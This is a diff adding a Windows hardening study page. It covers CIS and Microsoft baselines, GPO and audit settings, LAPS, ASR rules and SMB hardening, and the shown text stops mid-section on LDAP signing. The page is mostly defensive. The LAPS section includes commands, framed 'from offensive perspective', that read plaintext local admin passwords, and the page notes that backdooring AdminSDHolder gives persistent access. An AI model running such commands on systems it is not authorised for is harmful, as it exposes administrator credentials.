@@ -1,0 +1,1973 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | Windows Hardening</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-powershell.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>Windows Hardening &amp; Compliance</h1>
+    <hr>
+
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- ============================================================ -->
+      <!-- NOTES TAB                                                    -->
+      <!-- ============================================================ -->
+      <div class="tab-content active" id="notes">
+
+        <!-- ==================== CIS BENCHMARKS ==================== -->
+        <h2>CIS Benchmarks for Windows</h2>
+
+        <h3>Benchmark Structure</h3>
+        <table>
+          <tr><th>Level</th><th>Description</th><th>Impact</th></tr>
+          <tr><td>Level 1 (L1)</td><td>Essential security settings that can be configured without significant impact on functionality</td><td>Minimal — suitable for all systems</td></tr>
+          <tr><td>Level 2 (L2)</td><td>Defense-in-depth settings for high-security environments</td><td>May reduce functionality — for sensitive systems</td></tr>
+          <tr><td>Scored</td><td>Compliance with these settings can be measured programmatically</td><td>Affects compliance percentage</td></tr>
+          <tr><td>Not Scored</td><td>Best-practice recommendations that cannot be easily automated</td><td>Advisory only</td></tr>
+        </table>
+
+        <h3>Key CIS Recommendations — Windows Server</h3>
+        <table>
+          <tr><th>Category</th><th>Recommendation</th><th>Level</th></tr>
+          <tr><td>Account Policies</td><td>Minimum password length ≥ 14 characters</td><td>L1</td></tr>
+          <tr><td>Account Policies</td><td>Password history: remember 24 passwords</td><td>L1</td></tr>
+          <tr><td>Account Policies</td><td>Account lockout threshold: 5 invalid attempts</td><td>L1</td></tr>
+          <tr><td>Account Policies</td><td>Account lockout duration: ≥ 15 minutes</td><td>L1</td></tr>
+          <tr><td>Local Policies</td><td>Rename Administrator and Guest accounts</td><td>L1</td></tr>
+          <tr><td>Local Policies</td><td>Restrict remote access to SAM</td><td>L1</td></tr>
+          <tr><td>Security Options</td><td>UAC: Run all administrators in Admin Approval Mode</td><td>L1</td></tr>
+          <tr><td>Security Options</td><td>SMB signing: Always for servers</td><td>L1</td></tr>
+          <tr><td>Security Options</td><td>LDAP client signing: Require</td><td>L1</td></tr>
+          <tr><td>Audit Policy</td><td>Audit logon events: Success and Failure</td><td>L1</td></tr>
+          <tr><td>Audit Policy</td><td>Audit account logon events: Success and Failure</td><td>L1</td></tr>
+          <tr><td>Audit Policy</td><td>Audit privilege use: Success and Failure</td><td>L2</td></tr>
+          <tr><td>Network</td><td>Disable NetBIOS over TCP/IP on all interfaces</td><td>L2</td></tr>
+          <tr><td>Network</td><td>Disable LLMNR</td><td>L1</td></tr>
+          <tr><td>Services</td><td>Disable Print Spooler on DCs</td><td>L1</td></tr>
+          <tr><td>User Rights</td><td>Deny log on as a service: Guests</td><td>L1</td></tr>
+          <tr><td>User Rights</td><td>Debug programs: No one (except during troubleshooting)</td><td>L1</td></tr>
+        </table>
+
+        <h3>CIS Assessment Tools</h3>
+<pre><code class="language-powershell"># CIS-CAT Pro Assessor (commercial)
+# Run from command line
+.\Assessor-CLI.bat -b benchmarks\CIS_Microsoft_Windows_Server_2022_Benchmark_v1.0.0-xccdf.xml ^
+  -p "Level 1 - Domain Controller" -html -csv
+
+# Microsoft Security Compliance Toolkit — compare against baselines
+# Export current policy
+.\LGPO.exe /b C:\Backups\CurrentPolicy
+
+# PolicyAnalyzer — compare two GPO backups
+# Open PolicyAnalyzer.exe, load baseline GPO vs current GPO, review diffs
+
+# HardeningKitty (open-source PowerShell)
+Import-Module .\HardeningKitty.psm1
+Invoke-HardeningKitty -Mode Audit -Log -Report -FileFindingList .\lists\finding_list_cis_microsoft_windows_server_2022_22h2_machine.csv
+
+# AuditPol — quick check of current audit settings
+auditpol /get /category:*</code></pre>
+
+        <h3>Common CIS Gaps &amp; Misconfigurations</h3>
+        <table>
+          <tr><th>Gap</th><th>Risk</th><th>Remediation</th></tr>
+          <tr><td>SMB signing not required</td><td>NTLM relay attacks</td><td>GPO → Security Options → Microsoft network server: Digitally sign communications (always) = Enabled</td></tr>
+          <tr><td>LLMNR/NBT-NS enabled</td><td>Credential capture via Responder</td><td>GPO → Turn off multicast name resolution = Enabled; Disable NetBIOS over TCP/IP</td></tr>
+          <tr><td>WDigest auth enabled</td><td>Cleartext password in LSASS memory</td><td>Registry: <code>HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 0</code></td></tr>
+          <tr><td>Print Spooler on DCs</td><td>PrinterBug / PrintNightmare</td><td>Disable Spooler service on all DCs and servers that don't need printing</td></tr>
+          <tr><td>No LAPS deployed</td><td>Shared local admin passwords</td><td>Deploy Windows LAPS; randomize local admin passwords per machine</td></tr>
+          <tr><td>Unrestricted NTLM</td><td>Relay, pass-the-hash, cracking</td><td>Audit → Restrict → Deny NTLM progressively via GPO</td></tr>
+          <tr><td>RC4 Kerberos enabled</td><td>Kerberoasting with weak encryption</td><td>Disable RC4 via GPO: Network Security → Configure encryption types allowed for Kerberos</td></tr>
+          <tr><td>No credential guard</td><td>Mimikatz credential extraction</td><td>Enable Credential Guard via GPO or registry on supported hardware</td></tr>
+        </table>
+
+        <!-- ==================== MICROSOFT SECURITY BASELINES ==================== -->
+        <h2>Microsoft Security Baselines</h2>
+
+        <h3>Security Compliance Toolkit (SCT)</h3>
+        <p>Microsoft's official toolset for deploying and comparing security baselines. Includes GPO backups, documentation, and scripts for Windows 10/11/Server.</p>
+        <table>
+          <tr><th>Component</th><th>Purpose</th></tr>
+          <tr><td>LGPO.exe</td><td>Apply GPO settings to standalone/non-domain machines</td></tr>
+          <tr><td>PolicyAnalyzer</td><td>Compare GPO backups (baseline vs current), spot drifts</td></tr>
+          <tr><td>Security Baselines</td><td>Pre-built GPOs with Microsoft-recommended settings per OS version</td></tr>
+          <tr><td>SetObjectSecurity.exe</td><td>Apply security descriptors to registry keys and files</td></tr>
+        </table>
+
+<pre><code class="language-powershell"># LGPO.exe — Local Group Policy Object tool
+# Backup current local policy
+.\LGPO.exe /b C:\Backups\BeforeBaseline
+
+# Apply a security baseline
+.\LGPO.exe /g ".\Windows 11 v23H2 Security Baseline\GPOs\{GUID-HERE}"
+
+# Parse and apply registry.pol
+.\LGPO.exe /p C:\Baselines\machine_registry.pol
+
+# Apply security template (inf file)
+.\LGPO.exe /s C:\Baselines\GptTmpl.inf
+
+# Apply audit policy (csv)
+.\LGPO.exe /ac C:\Baselines\audit.csv
+
+# Export current policy to readable text
+.\LGPO.exe /parse /m C:\Windows\System32\GroupPolicy\Machine\Registry.pol > machine_policy.txt</code></pre>
+
+        <h3>Microsoft vs CIS Baselines Comparison</h3>
+        <table>
+          <tr><th>Setting</th><th>Microsoft Baseline</th><th>CIS L1</th><th>Notes</th></tr>
+          <tr><td>Min password length</td><td>14</td><td>14</td><td>Aligned</td></tr>
+          <tr><td>Account lockout</td><td>10 attempts</td><td>5 attempts</td><td>CIS is stricter</td></tr>
+          <tr><td>SMB signing (server)</td><td>Required</td><td>Required</td><td>Aligned</td></tr>
+          <tr><td>NTLMv2 enforcement</td><td>Send NTLMv2 only / Refuse LM &amp; NTLM</td><td>Same</td><td>Aligned</td></tr>
+          <tr><td>Remote Desktop NLA</td><td>Required</td><td>Required</td><td>Aligned</td></tr>
+          <tr><td>LSASS PPL</td><td>Enabled (Win11)</td><td>L2</td><td>MS enables by default on newer builds</td></tr>
+          <tr><td>Credential Guard</td><td>Enabled (supported HW)</td><td>L2</td><td>MS enables on Enterprise editions</td></tr>
+          <tr><td>Print Spooler on DC</td><td>Not addressed explicitly</td><td>Disabled (L1)</td><td>CIS is more explicit</td></tr>
+        </table>
+
+        <h3>Recommended Baseline Settings by Role</h3>
+        <table>
+          <tr><th>Setting</th><th>Domain Controller</th><th>Member Server</th><th>Workstation</th></tr>
+          <tr><td>Print Spooler</td><td>Disabled</td><td>Disabled (unless needed)</td><td>Enabled</td></tr>
+          <tr><td>SMB signing</td><td>Required</td><td>Required</td><td>Required</td></tr>
+          <tr><td>NTLM restriction</td><td>Deny all (target)</td><td>Audit → Restrict</td><td>Audit</td></tr>
+          <tr><td>Credential Guard</td><td>N/A (breaks replication)</td><td>Enabled</td><td>Enabled</td></tr>
+          <tr><td>LAPS</td><td>N/A</td><td>Deployed</td><td>Deployed</td></tr>
+          <tr><td>RDP NLA</td><td>Required</td><td>Required</td><td>Required</td></tr>
+          <tr><td>Firewall</td><td>Strict DC rules only</td><td>Deny inbound default</td><td>Deny inbound default</td></tr>
+          <tr><td>PowerShell logging</td><td>Module + Script Block</td><td>Module + Script Block</td><td>Module + Script Block</td></tr>
+          <tr><td>LSASS PPL</td><td>Enabled</td><td>Enabled</td><td>Enabled</td></tr>
+        </table>
+
+        <!-- ==================== GROUP POLICY HARDENING ==================== -->
+        <h2>Group Policy Hardening</h2>
+
+        <h3>GPO Architecture</h3>
+        <table>
+          <tr><th>Section</th><th>Scope</th><th>Key Areas</th></tr>
+          <tr><td>Computer Configuration</td><td>Applied to machine accounts</td><td>Security Settings, Windows Settings, Administrative Templates</td></tr>
+          <tr><td>User Configuration</td><td>Applied to user accounts</td><td>Folder Redirection, Software Settings, Administrative Templates</td></tr>
+        </table>
+        <p><strong>Processing Order:</strong> Local → Site → Domain → OU (last applied wins). Enforced GPOs override blocking. WMI filters add conditional logic.</p>
+
+        <h3>Account Policies</h3>
+<pre><code class="language-powershell"># View current password policy
+net accounts
+
+# GPO Path: Computer Configuration → Windows Settings → Security Settings → Account Policies
+
+# Recommended Password Policy:
+#   Enforce password history: 24 passwords
+#   Maximum password age: 60 days (or consider removing with strong passwords)
+#   Minimum password age: 1 day
+#   Minimum password length: 14 characters
+#   Password must meet complexity requirements: Enabled
+#   Store passwords using reversible encryption: Disabled
+
+# Recommended Account Lockout Policy:
+#   Account lockout threshold: 5 invalid logon attempts
+#   Account lockout duration: 15 minutes (or manual unlock)
+#   Reset account lockout counter after: 15 minutes
+
+# Kerberos Policy (Domain Controllers only):
+#   Maximum lifetime for user ticket: 10 hours
+#   Maximum lifetime for service ticket: 600 minutes
+#   Maximum lifetime for user ticket renewal: 7 days
+#   Maximum tolerance for computer clock synchronization: 5 minutes
+
+# Check via PowerShell
+Get-ADDefaultDomainPasswordPolicy
+Get-ADFineGrainedPasswordPolicy -Filter *</code></pre>
+
+        <h3>Advanced Audit Policy Configuration</h3>
+        <table>
+          <tr><th>Category</th><th>Subcategory</th><th>Recommended</th><th>Why</th></tr>
+          <tr><td>Account Logon</td><td>Credential Validation</td><td>Success, Failure</td><td>Detect brute force, pass-the-hash</td></tr>
+          <tr><td>Account Logon</td><td>Kerberos Auth Service</td><td>Success, Failure</td><td>AS-REP roasting detection</td></tr>
+          <tr><td>Account Logon</td><td>Kerberos Service Ticket</td><td>Success, Failure</td><td>Kerberoasting detection</td></tr>
+          <tr><td>Account Management</td><td>Security Group Management</td><td>Success</td><td>Detect privilege escalation</td></tr>
+          <tr><td>Account Management</td><td>User Account Management</td><td>Success, Failure</td><td>Account creation/modification</td></tr>
+          <tr><td>Logon/Logoff</td><td>Logon</td><td>Success, Failure</td><td>Track all authentication</td></tr>
+          <tr><td>Logon/Logoff</td><td>Special Logon</td><td>Success</td><td>Admin logon events</td></tr>
+          <tr><td>Object Access</td><td>File System</td><td>Failure</td><td>Detect unauthorized access attempts</td></tr>
+          <tr><td>Object Access</td><td>SAM</td><td>Success, Failure</td><td>SAM database access</td></tr>
+          <tr><td>Privilege Use</td><td>Sensitive Privilege Use</td><td>Success, Failure</td><td>SeDebug, SeTakeOwnership usage</td></tr>
+          <tr><td>Policy Change</td><td>Audit Policy Change</td><td>Success, Failure</td><td>Detect audit tampering</td></tr>
+          <tr><td>System</td><td>Security State Change</td><td>Success</td><td>System startup/shutdown</td></tr>
+          <tr><td>DS Access</td><td>Directory Service Changes</td><td>Success</td><td>AD object modifications (DCs)</td></tr>
+        </table>
+
+<pre><code class="language-powershell"># Configure Advanced Audit Policy via command line
+auditpol /set /subcategory:"Credential Validation" /success:enable /failure:enable
+auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
+auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
+auditpol /set /subcategory:"Security Group Management" /success:enable
+auditpol /set /subcategory:"User Account Management" /success:enable /failure:enable
+auditpol /set /subcategory:"Logon" /success:enable /failure:enable
+auditpol /set /subcategory:"Special Logon" /success:enable
+auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable
+auditpol /set /subcategory:"Audit Policy Change" /success:enable /failure:enable
+auditpol /set /subcategory:"Directory Service Changes" /success:enable
+
+# Verify all settings
+auditpol /get /category:* | findstr /i "success\|failure"
+
+# Force Advanced Audit Policy over basic (prevent conflict)
+# GPO: Computer Configuration → Security Settings → Local Policies → Security Options
+# "Audit: Force audit policy subcategory settings to override audit policy category settings" = Enabled</code></pre>
+
+        <h3>User Rights Assignment — Critical Privileges</h3>
+        <table>
+          <tr><th>Privilege</th><th>Risk</th><th>Recommendation</th></tr>
+          <tr><td>SeDebugPrivilege</td><td>Read/write any process memory (credential extraction, code injection)</td><td>Administrators only; remove from all regular accounts. Monitor Event ID 4672.</td></tr>
+          <tr><td>SeImpersonatePrivilege</td><td>Impersonate any token — Potato attacks to SYSTEM</td><td>Only LOCAL SERVICE, NETWORK SERVICE, Administrators, IIS AppPools (required for function)</td></tr>
+          <tr><td>SeBackupPrivilege</td><td>Read any file regardless of ACLs (SAM, NTDS.dit exfil)</td><td>Backup Operators group only; monitor usage with Privilege Use auditing</td></tr>
+          <tr><td>SeTakeOwnershipPrivilege</td><td>Take ownership of any object, then modify ACLs</td><td>Administrators only</td></tr>
+          <tr><td>SeRestorePrivilege</td><td>Write any file regardless of ACLs (DLL hijacking, overwrite)</td><td>Backup Operators only</td></tr>
+          <tr><td>SeLoadDriverPrivilege</td><td>Load kernel drivers (kernel-mode code execution)</td><td>Administrators only; monitor Event ID 4673</td></tr>
+          <tr><td>SeAssignPrimaryTokenPrivilege</td><td>Assign tokens to processes (used with SeImpersonate)</td><td>LOCAL SERVICE, NETWORK SERVICE only</td></tr>
+          <tr><td>SeTcbPrivilege</td><td>Act as part of the operating system</td><td>No accounts (should be empty)</td></tr>
+          <tr><td>SeCreateTokenPrivilege</td><td>Create arbitrary tokens</td><td>No accounts (should be empty)</td></tr>
+          <tr><td>SeMachineAccountPrivilege</td><td>Add workstations to domain (MachineAccountQuota abuse)</td><td>Limit to specific admin groups; set ms-DS-MachineAccountQuota = 0</td></tr>
+        </table>
+
+<pre><code class="language-powershell"># Check current user rights assignments
+secedit /export /cfg C:\temp\secpol.cfg
+Get-Content C:\temp\secpol.cfg | Select-String "SeDebugPrivilege|SeImpersonatePrivilege|SeBackupPrivilege"
+
+# Check who has SeDebugPrivilege
+$policy = Get-Content C:\temp\secpol.cfg
+$policy | Select-String "SeDebugPrivilege"
+
+# PowerView — find users with specific privileges across the domain
+# (Requires privileged access)
+Get-DomainGPO | ForEach-Object {
+    $gpoPath = $_.gpcfilesyspath
+    if (Test-Path "$gpoPath\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf") {
+        $content = Get-Content "$gpoPath\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
+        if ($content -match "SeDebugPrivilege") {
+            Write-Output "[!] GPO: $($_.displayname) grants SeDebugPrivilege"
+            $content | Select-String "SeDebugPrivilege"
+        }
+    }
+}</code></pre>
+
+        <h3>Security Options (Critical Settings)</h3>
+        <table>
+          <tr><th>Setting</th><th>Recommended Value</th><th>Purpose</th></tr>
+          <tr><td>UAC: Run all admins in Admin Approval Mode</td><td>Enabled</td><td>Prevent silent elevation</td></tr>
+          <tr><td>UAC: Behavior for admins</td><td>Prompt for consent on secure desktop</td><td>Prevent UAC bypass via UI manipulation</td></tr>
+          <tr><td>UAC: Behavior for standard users</td><td>Automatically deny</td><td>Prevent social engineering prompts</td></tr>
+          <tr><td>Network access: Restrict anonymous access to Named Pipes and Shares</td><td>Enabled</td><td>Block null session enumeration</td></tr>
+          <tr><td>Network access: Do not allow anonymous enum of SAM accounts</td><td>Enabled</td><td>Block user enumeration</td></tr>
+          <tr><td>Network access: Do not allow anonymous enum of SAM accounts and shares</td><td>Enabled</td><td>Block share enumeration</td></tr>
+          <tr><td>Network security: LAN Manager authentication level</td><td>Send NTLMv2 only. Refuse LM &amp; NTLM</td><td>Force NTLMv2, kill LM/NTLM</td></tr>
+          <tr><td>Microsoft network server: Digitally sign communications (always)</td><td>Enabled</td><td>Mandatory SMB signing</td></tr>
+          <tr><td>Microsoft network client: Digitally sign communications (always)</td><td>Enabled</td><td>Mutual SMB signing enforcement</td></tr>
+          <tr><td>Domain controller: LDAP server signing requirements</td><td>Require signing</td><td>Block LDAP relay</td></tr>
+          <tr><td>Network security: LDAP client signing requirements</td><td>Require signing</td><td>Block LDAP relay</td></tr>
+          <tr><td>Interactive logon: Don't display last signed-in</td><td>Enabled</td><td>Don't leak usernames</td></tr>
+        </table>
+
+        <h3>LAPS (Local Administrator Password Solution)</h3>
+<pre><code class="language-powershell"># Windows LAPS (built-in since April 2023 update)
+# Check if LAPS is deployed
+Get-LapsADPassword -Identity TARGET_COMPUTER -AsPlainText
+
+# Legacy LAPS — check schema extensions
+Get-ADObject "CN=ms-Mcs-AdmPwd,CN=Schema,CN=Configuration,DC=domain,DC=local"
+
+# Deploy Windows LAPS via GPO:
+# Computer Configuration → Administrative Templates → System → LAPS
+#   - "Configure password backup directory" → Active Directory
+#   - "Password Settings" → Length 20+, complexity enabled, age 30 days
+#   - "Name of administrator account to manage" → (custom admin name or blank for built-in)
+
+# View LAPS password (requires Read permission on ms-LAPS-Password attribute)
+Get-LapsADPassword -Identity WS01 -AsPlainText
+
+# Legacy LAPS commands
+Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime |
+  Select-Object Name, "ms-Mcs-AdmPwd", "ms-Mcs-AdmPwdExpirationTime"
+
+# Check who can read LAPS passwords (important for offensive ops)
+Find-AdmPwdExtendedRights -Identity "OU=Workstations,DC=domain,DC=local"
+
+# From offensive perspective — if you can read ms-Mcs-AdmPwd, you get local admin creds:
+Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object { $_."ms-Mcs-AdmPwd" -ne $null }</code></pre>
+
+        <h3>Fine-Grained Password Policies (PSOs)</h3>
+<pre><code class="language-powershell"># List all Fine-Grained Password Policies
+Get-ADFineGrainedPasswordPolicy -Filter *
+
+# Create a strict PSO for privileged accounts
+New-ADFineGrainedPasswordPolicy -Name "Tier0-PasswordPolicy" `
+  -Precedence 10 `
+  -MinPasswordLength 20 `
+  -PasswordHistoryCount 30 `
+  -ComplexityEnabled $true `
+  -ReversibleEncryptionEnabled $false `
+  -MaxPasswordAge "30.00:00:00" `
+  -MinPasswordAge "1.00:00:00" `
+  -LockoutThreshold 3 `
+  -LockoutDuration "00:30:00" `
+  -LockoutObservationWindow "00:30:00"
+
+# Apply PSO to a group
+Add-ADFineGrainedPasswordPolicySubject -Identity "Tier0-PasswordPolicy" -Subjects "Domain Admins"
+Add-ADFineGrainedPasswordPolicySubject -Identity "Tier0-PasswordPolicy" -Subjects "Tier0-Admins"
+
+# Check resultant password policy for a user
+Get-ADUserResultantPasswordPolicy -Identity "admin_user"</code></pre>
+
+        <h3>AdminSDHolder &amp; SDProp</h3>
+        <p>AdminSDHolder is a container whose ACL is stamped onto all protected groups (Domain Admins, Enterprise Admins, etc.) every 60 minutes by the SDProp process. Backdooring AdminSDHolder grants persistent access to all protected groups.</p>
+<pre><code class="language-powershell"># View AdminSDHolder ACL
+(Get-ACL "AD:\CN=AdminSDHolder,CN=System,DC=domain,DC=local").Access |
+  Format-Table IdentityReference, AccessControlType, ActiveDirectoryRights
+
+# Protected groups (their ACLs get overwritten by AdminSDHolder):
+# Domain Admins, Enterprise Admins, Schema Admins, Administrators,
+# Account Operators, Server Operators, Print Operators, Backup Operators,
+# Domain Controllers, Read-only Domain Controllers, Cert Publishers,
+# Replicator, krbtgt
+
+# Detect backdoor: look for unexpected ACEs on AdminSDHolder
+$acl = Get-ACL "AD:\CN=AdminSDHolder,CN=System,DC=domain,DC=local"
+$acl.Access | Where-Object { $_.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM|Administrators" }
+
+# Check if a user is protected (adminCount = 1)
+Get-ADUser -Filter { adminCount -eq 1 } -Properties adminCount, memberOf |
+  Select-Object Name, adminCount, memberOf
+
+# SDProp runs every 60 minutes by default. Change interval (NOT recommended in production):
+# HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters\AdminSDProtectFrequency (seconds)</code></pre>
+
+        <h3>GPO Inheritance &amp; Processing</h3>
+<pre><code class="language-powershell"># View GPO inheritance for an OU
+Get-GPInheritance -Target "OU=Workstations,DC=domain,DC=local"
+
+# List all GPOs linked to a specific OU
+(Get-GPInheritance -Target "OU=Servers,DC=domain,DC=local").GpoLinks
+
+# Find GPOs that are enforced
+Get-GPO -All | ForEach-Object {
+    $links = (Get-GPO $_.DisplayName).Description
+    [xml]$report = Get-GPOReport -Guid $_.Id -ReportType XML
+    Write-Output "$($_.DisplayName) - Status: $($_.GpoStatus)"
+}
+
+# Check WMI filters
+Get-ADObject -Filter 'objectClass -eq "msWMI-Som"' -Properties msWMI-Name, msWMI-Parm2 |
+  Select-Object "msWMI-Name", "msWMI-Parm2"
+
+# GPResult — see what GPOs apply to current machine/user
+gpresult /r
+gpresult /h C:\temp\gpresult.html   # HTML report
+
+# Blocking inheritance on an OU (blue circle icon in GPMC)
+# Security filtering: GPO applies only to specified security groups
+# WMI filtering: Conditional application based on WMI queries
+
+# Example WMI filter — apply only to Windows Server 2022:
+# SELECT * FROM Win32_OperatingSystem WHERE Caption LIKE "%Server 2022%"</code></pre>
+
+        <!-- ==================== ATTACK SURFACE REDUCTION ==================== -->
+        <h2>Attack Surface Reduction (ASR)</h2>
+
+        <h3>ASR Rules Reference</h3>
+        <table>
+          <tr><th>Rule</th><th>GUID</th><th>Description</th></tr>
+          <tr><td>Block executable content from email</td><td><code>BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550</code></td><td>Block executables and scripts in email attachments</td></tr>
+          <tr><td>Block all Office apps from creating child processes</td><td><code>D4F940AB-401B-4EFC-AADC-AD5F3C50688A</code></td><td>Prevent Office macro → cmd/powershell</td></tr>
+          <tr><td>Block Office apps from creating executable content</td><td><code>3B576869-A4EC-4529-8536-B80A7769E899</code></td><td>Block Office from writing executables to disk</td></tr>
+          <tr><td>Block Office apps from injecting code</td><td><code>75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84</code></td><td>Prevent Office DLL injection</td></tr>
+          <tr><td>Block JavaScript/VBScript from launching downloads</td><td><code>D3E037E1-3EB8-44C8-A917-57927947596D</code></td><td>Block script-based downloaders</td></tr>
+          <tr><td>Block execution of potentially obfuscated scripts</td><td><code>5BEB7EFE-FD9A-4556-801D-275E5FFC04CC</code></td><td>Detect and block obfuscation techniques</td></tr>
+          <tr><td>Block Win32 API calls from Office macros</td><td><code>92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B</code></td><td>Prevent macro API abuse</td></tr>
+          <tr><td>Block credential stealing from LSASS</td><td><code>9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2</code></td><td>Block processes from opening LSASS (like Mimikatz)</td></tr>
+          <tr><td>Block untrusted/unsigned processes from USB</td><td><code>B2B3F03D-6A65-4F7B-A9C7-1C7EF74A9BA4</code></td><td>Block USB-based malware execution</td></tr>
+          <tr><td>Block process creations from PSExec/WMI</td><td><code>D1E49AAC-8F56-4280-B9BA-993A6D77406C</code></td><td>Block lateral movement via PSExec/WMI</td></tr>
+          <tr><td>Block persistence through WMI event subscription</td><td><code>E6DB77E5-3DF2-4CF1-B95A-636979351E5B</code></td><td>Block WMI-based persistence</td></tr>
+          <tr><td>Use advanced protection against ransomware</td><td><code>C1DB55AB-C21A-4637-BB3F-A12568109D35</code></td><td>Reputation-based blocking of ransomware behavior</td></tr>
+          <tr><td>Block Adobe Reader from creating child processes</td><td><code>7674BA52-37EB-4A4F-A9A1-F0F9A1619A2C</code></td><td>Prevent PDF → child process attacks</td></tr>
+          <tr><td>Block abuse of exploited vulnerable signed drivers</td><td><code>56A863A9-875E-4185-98A7-B882C64B5CE5</code></td><td>Block known-vulnerable BYOVD drivers</td></tr>
+        </table>
+
+        <h3>ASR Deployment</h3>
+<pre><code class="language-powershell"># Enable ASR rules via PowerShell (Intune/GPO preferred for enterprise)
+# Mode: 0 = Disabled, 1 = Block, 2 = Audit, 6 = Warn
+
+# Set rules to AUDIT mode first (always start with audit!)
+$rules = @(
+    "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550",  # Block exe content from email
+    "D4F940AB-401B-4EFC-AADC-AD5F3C50688A",  # Block Office child processes
+    "3B576869-A4EC-4529-8536-B80A7769E899",  # Block Office exe content
+    "75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84",  # Block Office injection
+    "9E6C4E1F-7D60-472F-BA1A-A39EF669E4B2",  # Block cred stealing from LSASS
+    "D1E49AAC-8F56-4280-B9BA-993A6D77406C",  # Block PSExec/WMI process creation
+    "E6DB77E5-3DF2-4CF1-B95A-636979351E5B",  # Block WMI persistence
+    "C1DB55AB-C21A-4637-BB3F-A12568109D35"   # Advanced ransomware protection
+)
+
+# Set all to Audit mode
+foreach ($rule in $rules) {
+    Set-MpPreference -AttackSurfaceReductionRules_Ids $rule -AttackSurfaceReductionRules_Actions 2
+}
+
+# After validating in audit, switch to Block mode
+foreach ($rule in $rules) {
+    Set-MpPreference -AttackSurfaceReductionRules_Ids $rule -AttackSurfaceReductionRules_Actions 1
+}
+
+# Check current ASR rule status
+Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Ids
+Get-MpPreference | Select-Object -ExpandProperty AttackSurfaceReductionRules_Actions
+
+# Add exclusions (be careful — attackers target exclusion paths)
+Add-MpPreference -AttackSurfaceReductionOnlyExclusions "C:\LegacyApp\needed.exe"
+
+# View ASR events in Event Log
+Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
+  Where-Object { $_.Id -in @(1121, 1122, 1125, 1126) } |
+  Select-Object TimeCreated, Id, Message -First 20
+
+# Event IDs: 1121 = ASR Block, 1122 = ASR Audit, 1125 = Audit mode trigger, 1126 = Block mode trigger
+
+# GPO Path: Computer Configuration → Administrative Templates → 
+#   Windows Components → Microsoft Defender Antivirus → 
+#   Microsoft Defender Exploit Guard → Attack Surface Reduction</code></pre>
+
+        <!-- ==================== NETWORK HARDENING ==================== -->
+        <h2>Network Hardening</h2>
+
+        <h3>SMB Hardening</h3>
+<pre><code class="language-powershell"># Disable SMBv1 (critical — EternalBlue, WannaCry)
+# Check current status
+Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol, EnableSMB2Protocol
+Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
+
+# Disable SMBv1 server
+Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
+
+# Disable SMBv1 client
+Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart
+# Or via DISM:
+# dism /online /Disable-Feature /FeatureName:SMB1Protocol
+
+# Remove SMBv1 entirely (Windows Server)
+Remove-WindowsFeature FS-SMB1
+
+# Require SMB signing (prevents relay attacks)
+Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
+Set-SmbClientConfiguration -RequireSecuritySignature $true -Force
+
+# Require SMB encryption (SMB 3.0+)
+Set-SmbServerConfiguration -EncryptData $true -Force
+
+# Disable guest authentication fallback
+Set-SmbClientConfiguration -EnableInsecureGuestLogons $false -Force
+
+# GPO paths for SMB signing:
+# Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
+#   "Microsoft network server: Digitally sign communications (always)" = Enabled
+#   "Microsoft network client: Digitally sign communications (always)" = Enabled</code></pre>
+
+        <h3>LDAP Signing &amp; Channel Binding</h3>
+<pre><code class="language-powershell"># LDAP Signing (prevents LDAP relay)
+# GPO: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
+# "Domain controller: LDAP server signing requirements" = Require signing
+# Registry on DC:
